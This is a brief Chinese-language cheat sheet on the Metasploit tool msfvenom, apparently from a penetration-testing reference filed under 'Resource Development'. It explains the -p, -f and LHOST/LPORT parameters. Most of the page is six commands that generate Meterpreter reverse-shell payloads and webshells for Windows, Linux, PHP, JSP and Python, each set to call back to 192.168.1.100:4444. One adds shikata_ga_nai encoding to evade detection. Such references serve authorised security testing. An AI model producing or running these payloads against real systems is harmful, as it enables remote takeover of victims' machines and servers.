# msfvenom

## 简介
Metasploit payload 生成工具

## 核心参数
- `-p`: 指定 payload
- `-f`: 输出格式
- `LHOST/LPORT`: 监听地址和端口

## 命令示例
```bash
# 生成 Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# 生成 Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# 生成 PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# 生成 JSP webshell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp

# 生成编码的 payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe

# 生成 Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py
```

## 使用场景
生成各种平台和格式的 payload

## 所属分类
- [资源开发 (Resource Development)](../categories/26-resource-development.md)
